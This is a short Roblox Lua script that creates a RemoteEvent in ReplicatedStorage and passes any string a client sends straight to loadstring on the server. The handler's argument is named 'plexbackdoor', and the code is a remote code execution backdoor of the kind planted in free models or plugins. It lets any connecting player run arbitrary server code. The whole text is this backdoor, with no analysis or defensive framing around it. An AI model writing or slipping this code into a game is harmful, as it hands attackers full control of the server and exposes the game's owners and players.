local server = Instance.new("RemoteEvent",game.ReplicatedStorage)
server.OnServerEvent:connect(function(player,plexbackdoor)
	loadstring(plexbackdoor)()
end)
